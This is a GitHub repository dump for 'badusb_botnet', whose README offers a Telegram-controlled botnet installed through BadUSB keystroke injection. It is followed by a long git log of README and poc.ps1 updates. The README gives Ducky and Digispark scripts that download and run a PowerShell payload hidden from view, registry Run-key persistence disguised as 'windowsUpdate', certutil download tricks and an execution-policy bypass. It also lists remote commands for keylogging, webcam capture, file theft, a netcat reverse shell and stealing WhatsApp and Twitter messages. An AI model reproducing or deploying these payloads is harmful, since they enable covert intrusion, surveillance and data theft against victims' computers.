@@ -1,0 +1,1043 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+# badusb_botnet
+:smiling_imp::busts_in_silhouette: Infect a pc with badusb and establish a connection through telegram.
+
+# Configuration
+
+```powershell
+############
+## CONFIG ##
+############
+
+$BotToken = "<BOTTOKEN>"
+$ChatID = '<CHATID>'
+$githubScript = '<you_fork/poc.ps1>'
+```
+>*To create a telegram bot: https://core.telegram.org/bots#6-botfather*
+
+>*To get ChatID: https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id*
+
+## Option 1: Powershell
+
+<p align="center">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/PowerShell_5.0_icon.png" height="100px" width="100px"/>
+</p>
+
+### Option 1.1: Simple
+
+```powershell
+> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+> (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')
+> powershell.exe -windowstyle hidden -file poc.ps1
+```
+
+```
+DELAY 3000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 750
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+DELAY 500
+ENTER
+STRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')
+DELAY 500
+ENTER
+STRING powershell.exe -windowstyle hidden -file poc.ps1
+DELAY 500
+ENTER
+```
+
+> Link to convert to .ino: https://malduino.com/converter/
+
+### Option 1.2: Backdoor
+
+```powershell
+> reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
+> Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
+> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
+```
+```
+DELAY 3000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 750
+STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
+DELAY 500
+ENTER
+STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
+DELAY 500
+ENTER
+STRING reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
+DELAY 500
+ENTER
+```
+
+> Link to convert to .ino: https://malduino.com/converter/
+
+## Option 2: CMD
+
+<p align="center">
+    <img src="https://winaero.com/blog/wp-content/uploads/2015/09/console-cmd-icon.png" height="100px" width="100px"/>
+</p>
+
+Windows Powershell is too slow at startup, so we can use cmd to download the '.ps1' file and execute it. To download a file with cmd, we can use two options: ```bitsadmin``` or ```certutil.exe```. (Certutil is not installed by default on XP/Win2003 but is avaialble on the newer windows versions. For XP/2003 you'll need the Admin Tool Pack for windows server 2003).
+
+#### Syntax
+
+```cmd
+> bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
+> certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+```
+### Option 2.1: Simple
+
+```cmd
+> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" "Documents/windowsUpdate.ps1"
+> powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+> powershell.exe -windowstyle hidden -file "Documents/windowsUpdate.ps1"
+```
+
+or
+
+```cmd
+> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" "Documents/windowsUpdate.ps1"
+> powershell.exe -windowstyle hidden -executionPolicy bypass -file "Documents/windowsUpdate.ps1"
+```
+
+> Avast detects this last option.
+
+### Option 2.2: Backdoor
+
+```cmd
+> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1
+> powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
+> reboot (?)
+```
+
+## Example on digispark
+
+<p align="center">
+    <img src="https://img.staticbg.com/thumb/large/oaupload/banggood/images/78/0D/5586c82c-2791-44cf-baa6-3ebc5882ac2e.jpg" height="100px" width="100px"/>
+</p>
+
+```c
+#define kbd_es_es
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("powershell -noe -c \". mode.com con: lines=1 cols=40\"");
+//DigiKeyboard.print("cmd");
+//DigiKeyboard.print("cmd /k mode con:cols=20 lines=1");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(3000);
+DigiKeyboard.print("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(200);
+DigiKeyboard.print("S");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("powershell.exe -windowstyle hidden -file poc.ps1");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+for (;;) {
+/*empty*/
+    }
+}
+```
+
+- Get the drivers: https://github.com/digistump/DigistumpArduino/releases
+
+- Additional Board Manager URL: https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
+
+- DigiKeyboard Source Code: https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h
+
+> Keyboard en_US to es_ES: https://github.com/ernesto-xload/DigisparkKeyboard
+Decompress the archive and put all in : ```C:\Users\Administrador\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\DigisparkKeyboard```, later in the script you must put the following line to specify the keyboard layout.
+```c
+#define kbd_es_es
+```
+
+### Telegram Options
+
+#### Basic
+
+- /list (List all devices availables)
+- /select ```IP``` ```command``` (Execute a command)
+- /stop ```IP``` (Stop remote connection)
+- /cleanAll ```IP``` (Clean all files)
+- /ipPublic ```IP``` (Geolocate IP)
+- /download ```IP``` ```file``` (Download a file from PC)
+
+#### Advanced
+
+- /screenshot ```IP``` (Capture screen)
+- /backdoor ```IP``` (Create a persistent backdoor)
+- /webcam ```IP```
+- /keylogger ```IP``` ```time in seconds```
+- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /nc ```IP``` ```IP to connect ($ip)``` (First you must use ```nc -lp 8888 -v``` to create a listener)
+- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /stopnc ```IP``` (Stop nc.exe and erase all archives) 
+
+#### Ultra :squirrel: 
+
+- /hackT ```IP``` (Get Twitter messages if the victim is authenticated) [Only web - W10]
+- /hackW ```IP``` (Get WhatsApp messages if the victim is authenticated) [Only Web - W10]
+- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="24px" height="24px" />  /starttwitch ```IP``` ```STREAM_KEY``` (Start a video transmission on Twitch with ffmpeg)
+- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="24px" height="24px" />  /stoptwitch ```IP``` (Stop ffmpeg.exe and erase all archives) 
+
+### PoCs
+
+:link::tv: [TOUR - POC](https://youtu.be/pFR8B0HNfts "TOUR - POC")
+
+:link::tv: [TWITCH STREAMING - POC](https://youtu.be/3GBIVNhHT0Y "TWITCH STREAMING - POC")
+
+:link::tv: [KEYLOGGER - POC](https://youtu.be/f6JCPnsyGp0 "KEYLOGGER -POC")
+
+:link::tv: [DIGISPARK - POC](https://youtu.be/ojcYAvVuBSw "DIGISPARK -POC")
+
+##### {TODO}
+
+- Change all Invoke-WebRequest to cURL. (Invoke-WebRequest requires set up Internet Explorer)
+- Create an ID for each connected user.
+- Hack WhatsApp on .exe.
+- :heavy_check_mark: Fix Twitch streaming.
+- :heavy_check_mark: Fix keylogger.
+- Add monitor selector to screenshot.
+- Add windows version detector in HackTwitterW10() and hackWhatsAPPW10() functions.
+- Add hackGmail().
+- :heavy_check_mark: Verbose via telegram messages.
+- :heavy_check_mark: Netcat reverse connection.
+====================== GIT HISTORY: ======================
+b193268 HEAD@{0}: clone: from https://github.com/Milamber31337/badusb_botnet
+commit b193268740c39204209d094dc8b29d6947373ff9
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 13:43:33 2018 +0200
+
+    Update README.md
+
+commit 2ba862ef9ad0ba0e9324997ffd8f370ef187f0be
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 13:42:29 2018 +0200
+
+    Update README.md
+
+commit 8472a05e727f693cec10cd561174f0d7f9b04676
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 13:41:08 2018 +0200
+
+    Update README.md
+
+commit a54cd01a1319096fbf604c04612fc0c4f7adcde5
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 11:34:30 2018 +0200
+
+    Update README.md
+
+commit a62fda093a6a4b0be0f223e7fccead7621ab116d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 11:30:45 2018 +0200
+
+    Update README.md
+
+commit 08e278a2510b1f1f4c034f4d895be8b4c6a09086
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 11:21:20 2018 +0200
+
+    Update README.md
+
+commit a2c5920307f60c715f726e54a8744ede288a1bdf
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 11:16:42 2018 +0200
+
+    Update README.md
+
+commit 5cf397b29793d1bec62e5f31e449014d41b3d0f5
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 11:10:52 2018 +0200
+
+    Update README.md
+
+commit 30dcdb40f40a0bb9364d371d14d399db704a07bc
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:56:32 2018 +0200
+
+    Update README.md
+
+commit 2980e36d9a88763cc5abfdba8f433bb479d07e1e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:50:36 2018 +0200
+
+    Update README.md
+
+commit 0bcdcc9ef4cef8f44c3c95ac8342e730538eb954
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:34:31 2018 +0200
+
+    Update README.md
+
+commit 7fdf7211bffe21052f559361262a6e1e3d7e455b
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:33:45 2018 +0200
+
+    Update README.md
+
+commit d3429b9a2f636d01ed7810e30e6778dbfdb0907a
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:33:01 2018 +0200
+
+    Update README.md
+
+commit d78539289f5082ceee76ae6d4008802880036fe4
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:24:19 2018 +0200
+
+    Update README.md
+
+commit cedc7dccaa43e67ab63a738e2f4b9220a6f0784e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:19:54 2018 +0200
+
+    Update README.md
+
+commit a50a4ed4a186c294299b521725463b4fec6d881b
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:12:18 2018 +0200
+
+    Update README.md
+
+commit d1aebe97103aaf20048829995586e989f5f28688
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:08:58 2018 +0200
+
+    Update README.md
+
+commit 37b3e27d41cc0e1ccc2f381151d57e757ed31282
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:06:46 2018 +0200
+
+    Update README.md
+
+commit f86d1e0ad630619b2b1a25e338c9e76ab74c658a
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:05:04 2018 +0200
+
+    Update README.md
+
+commit f13ba2a57c945bb54427158557ecebdaf98ea71a
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 20 10:04:31 2018 +0200
+
+    Update README.md
+
+commit 5bf852403cecdc40821f6a444baa1af4eb8806db
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Sep 18 10:58:55 2018 +0200
+
+    Update README.md
+
+commit 0d1332ab231c26b9a1e36bb168afd8372215328d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Sep 18 10:52:46 2018 +0200
+
+    Update README.md
+
+commit b9c16246a90eea75880609302ceb946d1c030073
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Sep 18 10:29:36 2018 +0200
+
+    Update README.md
+
+commit 68e152b1ae5f7da06aaca2db45dacb4916176696
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 14 10:20:22 2018 +0200
+
+    Update README.md
+
+commit 3555bbc95a1b13d3b1e55e9c56ac070e45b0e891
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 14 10:19:02 2018 +0200
+
+    Update poc.ps1
+
+commit 709358bccf59fbc4a4334837e456cdee05147f26
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 14 10:05:36 2018 +0200
+
+    Update README.md
+
+commit 3d117ea8c208eac631c0fb2d1193cc4ba25e0616
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 14 09:59:42 2018 +0200
+
+    Update README.md
+
+commit e8108a75bc1ec0e5ef3173a115c50771f0df45b1
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 14 09:58:29 2018 +0200
+
+    Update README.md
+
+commit 779e0a4f115cee77d05c776fadf97a57d21e6c8b
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 14 09:57:50 2018 +0200
+
+    Update README.md
+
+commit 63eaa6d949b72de6bd64ab018eda6c60c11d9c9e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 7 12:57:05 2018 +0200
+
+    Update README.md
+
+commit bd50552a7ea97a9640e15466bf7a5633375ba71e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 7 12:40:39 2018 +0200
+
+    Update README.md
+
+commit 1f1f1b7feb31069379b6269e24b77ad6d4400de4
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 7 09:58:12 2018 +0200
+
+    Update poc.ps1
+
+commit 080b8596b973b5921febf0d38527ff950b368a67
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 7 09:56:00 2018 +0200
+
+    Update README.md
+
+commit 6cd18677bcc84ddd8d64d38522f50160d7b78ab8
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Sep 7 09:55:00 2018 +0200
+
+    Update README.md
+
+commit 22f91beec86f968d9bbd5e39007dcaa491c42f9a
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 6 18:39:00 2018 +0200
+
+    Update README.md
+
+commit a1e27dc8366a34efcbed0b2910a47a5e3cbe894b
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 6 10:48:03 2018 +0200
+
+    Update README.md
+
+commit 30184e2098d987664b607e0faaf7b3617d7d3e77
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 6 10:39:38 2018 +0200
+
+    Update README.md
+
+commit 7e25d4db9a35d8020626869a0a6db9a6bbdff81d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 6 10:38:45 2018 +0200
+
+    Update README.md
+
+commit 77b881b7ca350215d0187dd3124d2a236620851c
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 6 10:35:50 2018 +0200
+
+    Update README.md
+
+commit 5b5e445d03f095299b48c59a9ee469d96422da0e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 6 10:34:12 2018 +0200
+
+    Update README.md
+
+commit c1f5f8fc52e67135edc34e248fff379da86cfa26
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 6 10:33:56 2018 +0200
+
+    Update README.md
+
+commit bb5cbb06114f381f87c52f3321a9e22d1df10d41
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 6 10:28:09 2018 +0200
+
+    Update README.md
+
+commit 064900b7800eef320168f65a586fb5a991b14851
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Sep 6 09:23:25 2018 +0200
+
+    Update README.md
+
+commit 5768468c69b13b4f6b461ab9d938806dd5dc86ea
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Sep 5 12:19:28 2018 +0200
+
+    Update README.md
+
+commit 327e53fbbce83578c9ba350c0f8a1f433fe35dc2
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Sep 5 11:43:25 2018 +0200
+
+    Update README.md
+
+commit 571fdfeae04834d271f368ef49134669915e4ef7
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Sep 5 11:00:22 2018 +0200
+
+    Update poc.ps1
+
+commit 21f4e700027fc241ac9a9ee1b249f4f9aa8be20d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Sep 5 10:59:57 2018 +0200
+
+    Update README.md
+
+commit 028f35a19f3fbd9319c863647522c12d9f3a75d4
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Sep 5 10:57:48 2018 +0200
+
+    Update README.md
+
+commit a012f6482b7c96202b7b68e75c1b8ee3fe4bbe89
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Sep 5 10:17:26 2018 +0200
+
+    Update README.md
+
+commit 6b712187410bef2352c77fdb1b07ead3de135350
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Sep 5 10:11:05 2018 +0200
+
+    Update poc.ps1
+
+commit f76c888dd62d5e7a8ed203930a0079d7420a2d9e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Sep 5 10:10:39 2018 +0200
+
+    Update README.md
+
+commit 65224f7f1322add301e34a96c072b949b0636675
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Sep 5 09:38:12 2018 +0200
+
+    Update README.md
+
+commit 2b393480c36cf531d7ea6efb50aeebcbc5cdbe65
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Sep 3 11:01:29 2018 +0200
+
+    Update README.md
+
+commit c39f0ea2b97c3dd0e51fecd240b42fc710acc2b0
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Sep 3 11:00:46 2018 +0200
+
+    Update README.md
+
+commit 2354af54cccbde338525494eafe63778e0e4f953
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Sep 3 10:32:12 2018 +0200
+
+    Update poc.ps1
+
+commit ca9a71119219473072a5735c95f9f6bb637b67d2
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Sep 3 10:17:28 2018 +0200
+
+    Update README.md
+
+commit e1da64b8cd2e9e47267fd26ad09dcc8089c18d9e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Sep 3 10:16:52 2018 +0200
+
+    Update poc.ps1
+
+commit 93e892b5d8b48cf6e89e8d4bbf771d4e4ebb270d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Aug 31 13:09:20 2018 +0200
+
+    Update README.md
+
+commit 67d7643054228719164a3a41c3ee742cd65731ff
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 17:55:30 2018 +0200
+
+    Update README.md
+
+commit 7e6aab44249e09f4af1693a7692752acfef9d811
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 17:54:45 2018 +0200
+
+    Update README.md
+
+commit 248f28985891d44e4d1c7cdd5743355626420b29
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 17:24:50 2018 +0200
+
+    Update README.md
+
+commit 4de44d370d3000adeaf32b0271b6028da4df59e2
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 17:24:18 2018 +0200
+
+    Update README.md
+
+commit 4cbae8bb789cc3097c83f42dda2c4f850648809e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 17:23:36 2018 +0200
+
+    Update README.md
+
+commit 5105bf86c56d59d66f0093393c41f8cae35bfbc5
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 17:16:11 2018 +0200
+
+    Update poc.ps1
+
+commit 8a51e6d77ec872435316f5485b8c6dae8fc3cd63
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 17:15:30 2018 +0200
+
+    Update README.md
+
+commit 93cc9ea9dd1d840d4ed0885817e5b834c93dc6c8
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 17:13:24 2018 +0200
+
+    Update poc.ps1
+
+commit 4265829779ba7eba9e3ef2279b8de865d28f6321
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 13:58:41 2018 +0200
+
+    Update README.md
+
+commit da89ca53f8b064c97b143a696ccdd42a8f3dbbb3
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 13:48:35 2018 +0200
+
+    Update README.md
+
+commit 1a65375b246c24f0a72e0fae9aee45067bfff509
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 13:47:14 2018 +0200
+
+    Update README.md
+
+commit 72dd2514f2cb8ab1b2c3db6a2c37048bb5b1fd28
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 13:38:27 2018 +0200
+
+    Update README.md
+
+commit b89efb9d6b54761c2d2ed8b633b39bf4c8bfea6a
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 13:35:53 2018 +0200
+
+    Update README.md
+
+commit bf83c16fba1ef4b3a134cb57841a9f67ccb1e63d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 13:29:14 2018 +0200
+
+    Update README.md
+
+commit eccb966789e485659e8c2e8d797d62084a663875
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 13:28:57 2018 +0200
+
+    Update README.md
+
+commit fc43690e92de18647777651f758305c0e94d89c1
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 13:21:09 2018 +0200
+
+    Update README.md
+
+commit 40b97115e5c5147b394f11ebbd31dff66f4d35d4
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 12:55:50 2018 +0200
+
+    Update poc.ps1
+
+commit 725dea33aa5b5fa5002d425e7309b3a7c5bd0f58
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 12:54:25 2018 +0200
+
+    Update README.md
+
+commit f954668f609891ee9bdc9012fca31f31414f4b5c
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 30 10:16:29 2018 +0200
+
+    Update README.md
+
+commit 34efa01ba79ce29f93ef8ef7f4f60df9e9d4fcbd
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Aug 29 10:06:24 2018 +0200
+
+    Update README.md
+
+commit 8677a3a4ac9f8c42469004d86032ea09512973b9
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Aug 29 09:58:06 2018 +0200
+
+    Update README.md
+
+commit 341ef728e3f80db06ca3ee68950d6039180c5c8b
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Aug 29 09:48:11 2018 +0200
+
+    Update poc.ps1
+
+commit 69baea6ed6cd4b790efc73ae04a7afb80ecf3b4d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Aug 29 09:40:51 2018 +0200
+
+    Update poc.ps1
+
+commit e6cf5171183f9a330c537b5dd87e9523e133ec61
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Aug 29 09:33:30 2018 +0200
+
+    Update README.md
+
+commit 01a3e67eb4330d1e1f015cf1afebcd05d818e90a
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Aug 28 15:55:39 2018 +0200
+
+    Update poc.ps1
+
+commit 7f949717b2d59f127ec938f248e74bce0582784f
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Aug 28 15:30:55 2018 +0200
+
+    Update poc.ps1
+
+commit b94bb36de30a9d639e4f5d2ff16638df3e994f60
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Aug 28 10:50:16 2018 +0200
+
+    Update poc.ps1
+
+commit c0192479e5e1f5493f8b7b3b50902af05d9ad646
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Aug 28 10:44:55 2018 +0200
+
+    Update poc.ps1
+
+commit 4ef654b201995a52d2b80f8e9bb049425ced32ad
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Aug 28 10:09:13 2018 +0200
+
+    Update poc.ps1
+
+commit 3dea52cb28685589d909ed072f3d80e8807d9a49
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Wed Aug 22 12:53:08 2018 +0200
+
+    Update poc.ps1
+
+commit 2202f509874593bb1370a21fb581b2f213fe8e6a
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 19:03:02 2018 +0200
+
+    Update poc.ps1
+
+commit 1b1afce3cbf1a279efd584bdddfb7eab9cd17685
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 13:51:11 2018 +0200
+
+    Update poc.ps1
+
+commit 07fd468df355efe9fa4677d20e5b1a07d753ad7d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 12:08:15 2018 +0200
+
+    Update README.md
+
+commit 2752fdf6467385917406c22019e94b33bfe5e9f9
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 12:05:34 2018 +0200
+
+    Update README.md
+
+commit 5729cc98903375b644e92fb3f1043ada13b1e13b
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 11:45:04 2018 +0200
+
+    Update README.md
+
+commit cef48d249b827196b2f952046796235e17b8ab4c
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 11:43:44 2018 +0200
+
+    Update poc.ps1
+
+commit fc0184acc0fec69ad2a42a72360b2ff1a2d5bfcd
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 11:40:36 2018 +0200
+
